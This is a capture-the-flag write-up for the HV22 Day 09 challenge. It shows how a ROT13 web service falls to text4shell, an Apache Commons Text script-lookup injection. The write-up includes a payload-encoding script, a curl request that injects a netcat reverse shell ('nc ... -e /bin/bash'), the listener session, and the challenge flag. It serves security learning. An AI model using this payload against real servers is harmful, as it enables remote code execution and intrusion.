CSS: ../meta/avenir-white.css

[← Day 08](../day08/) / [↑ TOC](../README.md) / [→ Day 10](../day10/)


# Day 09 / HV22.09 Santa's Text



## Challenge

* Author: yuva
* Tags:   `#pentest`
* Level:  medium

Santa recently created some Text with a 🐚, which is said to be vulnerable code.
Santa has put this Text in his library, putting the library in danger. He
doesn't know yet that this could pose a risk to his server. Can you backdoor the
server and find all of Santa's secrets?



## Solution

This challenge. It was not my friend. It took me a loooong time, a little
help from _bread_ to find the right rabbit hole and some sanity-checking from
_jokker_ to to uncover a stupid mistake: thank you both!

The challenge consisted of a web service where you could "search for a gift" by
entering a string ...

![](screenGiftSearchPage.png)

The entered string would seemingly be transformed into something else. The
transformation scheme was easily identified as [ROT13][wenRot13] for lower and
upper case alphabetic characters.

Example: `Hello` becomes `Uryyb`

[wenRot13]: https://en.wikipedia.org/wiki/ROT13

I decided to switch to _curl(1)_ in order to gain more precise control over
the input data ... \
(The trailing `| tr '\r' '\n'` was necessary to convert the carriage-returns
`\r` in the response into proper linefeeds `\n`.)

``` sh
$ serverAddr="f1151278-df4e-4fe8-8703-701c41e26fff.idocker.vuln.land"

$ curl https://$serverAddr/santa/attack/?search="gimmiflag" | tr '\r' '\n'
[...]
<p>Here is your gift:</p> 
<p class="p1">tvzzvSynt<br>Did it work?</b>
<br>
[...]

$ curl https://$serverAddr/santa/attack/?search="tvzzvSynt" | tr '\r' '\n'
[...]
<p>Here is your gift:</p> 
<p class="p1">gimmiFlag<br>Did it work?</b>
<br>
[...]
```

I spent at least one hour trying to find a suitable shell code injection. But
there were none to be found. At least another hour was spent trying to make
log4shell working. No dice.

The previously mentioned right rabbit hole was: `text4shell`.

One could have come to that insight by web searching for `text shell vulnerable
backdoor` (all words from the description) but I simply hadn't tried exactly
these words together. Also I have to admit, that I hadn't heard about
`text4shell` up to that point.

Anyways there is a nice [blog article about text4shell][blogText4Shell], that I
used to solve the challenge. It boils down the following: Within the _Apache
Commons Text Library_ there is a handy-dandy method to replace specifically marked
up text passages with something else. For example if `The quick brown
${fastAnimal} jumps over the lazy ${slowAnimal}` is the marked up text, then the
idea is that you create a hash map to define replacements. Something along the
lines of ...

[blogText4Shell]: https://securityboulevard.com/2022/10/vulnerability-explained-remote-code-execution-through-text4shell/

``` java
[...]
hashMap.put("fastAnimal","fox");
hashMap.put("slowAnimal","dog");
[...]
```

Applying the handy-dandy method triggers the replacement ...

``` java
[...]
StringSubstitutor sub = new StringSubstitutor(hashMap);
String output = sub.replace("The quick brown ${fastAnimal} jumps over the lazy ${slowAnimal}")
[...]
```

The interesting part about this `StringSubstitutor` is, that it can also do
predefined replacements. For example `${date:yyyy-MM-dd}` would be replaced
with the current date. (Notice the colon in further examples.)

Even more interesting: There is also a predefined replacement scheme by the name
`script`. It is meant to be used to execute something and be replaced with what
ever the execution returns. It can be used to execute an arbitrary shell command
and thus as an exploit ...

``` java
${script:javascript:java.lang.Runtime.getRuntime().exec('echo OhNoes')}
```

To be clear: the whole line here gets replaced with `OhNoes`.

On the challenge server there is probably such a replacement method in use to do
the Rot13. The circumstance can be used to run a reverse shell command. But
whatever string we want to get in there has to overcome two hurdles first:

1. Everything must be url-encoded
2. The exploit code has to survive the rot13

A shellscript `encode.sh` was written to handle both problems ...

``` sh
#!/bin/bash

urlencode() (
    string=${*:-$(
        cat -
        printf x
    )}
    [ -n "$*" ] || string=${string%x}
    # Zero index, + 1 to start from 1 since sed starts from 1
    lines=$(($(printf %s "$string" | wc -l) + 1))
    lineno=1
    while [ $lineno -le $lines ]; do
        currline=$(printf %s "$string" | sed "${lineno}q;d")
        pos=1
        chars=$(printf %s "$currline" | wc -c)
        while [ $pos -le "$chars" ]; do
            c=$(printf %s "$currline" | cut -b$pos)
            case $c in
            [-_.~a-zA-Z0-9]) printf %c "$c" ;;
            *) printf %%%02X "'${c:-\n}'" ;;
            esac
            pos=$((pos + 1))
        done
        [ $lineno -eq $lines ] || printf %%0A
        lineno=$((lineno + 1))
    done
)

rot13() {
    echo "$1" \
    | tr 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' \
         'nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM'
}

urlencode "$(rot13 "$1")"
```

(Note: it's not wise to do the rot13 last because that also rotates the hex `:^)`)

The final attack worked something like this. A netcat reverse shell was used as
injection. \
(In reality the whole process was far messier `;-)`)

``` sh
$ serverAddr="f1151278-df4e-4fe8-8703-701c41e26fff.idocker.vuln.land"
$ serverUrl="https://${serverAddr}/santa/attack/"

$ inject='nc 10.13.0.70 4242 -e /bin/bash'
$ payload='${script:javascript:java.lang.Runtime.getRuntime().exec("'"$inject"'")}'

$ curl ${serverUrl}?search="$(./encode.sh "$payload")"
```

A netcat listener was setup beforehand to receive the reverse shell connection.
It is followed by the shell session that shows navigating to and printing out
the file `/SANTA/FLAG.txt` on the vulnerable server instance ...

``` sh
$ nc -vlp 4242
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4242
Ncat: Listening on 0.0.0.0:4242
Ncat: Connection from 152.96.7.3.
Ncat: Connection from 152.96.7.3:39623.
cd /
ls
SANTA
app
bin
dev
etc
flag-deploy-scripts
home
init
lib
libexec
media
mnt
opt
proc
release.txt
root
run
sbin
src
srv
sys
tmp
usr
var
web
cd SANTA
ls
FLAG.txt
cat FLAG.txt
HV22{th!s_Text_5h€LL_Com€5_₣₹0M_SANTAA!!}
```

--------------------------------------------------------------------------------

Flag: `HV22{th!s_Text_5h€LL_Com€5_₣₹0M_SANTAA!!}`

[← Day 08](../day08/) / [↑ TOC](../README.md) / [→ Day 10](../day10/)
